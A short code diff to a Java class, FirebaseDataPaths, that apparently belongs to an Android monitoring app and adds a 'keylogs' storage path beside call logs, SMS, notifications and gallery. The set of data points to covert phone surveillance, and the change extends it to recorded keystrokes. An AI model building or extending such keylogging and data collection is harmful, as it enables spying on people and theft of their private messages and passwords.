@@ -15,6 +15,7 @@ import java.util.Map;
  *   call_logs/{id}/
  *   sms/{id}/
  *   notifications/{id}/
+ *   keylogs/{id}/
  *   gallery/{id}/
  *   sync_status/{dataType}/
  */
@@ -46,6 +47,10 @@ public final class FirebaseDataPaths {
 
     public static DatabaseReference notifications(String userId) {
         return userData(userId).child("notifications");
+    }
+
+    public static DatabaseReference keylogs(String userId) {
+        return userData(userId).child("keylogs");
     }
 
     public static DatabaseReference gallery(String userId) {
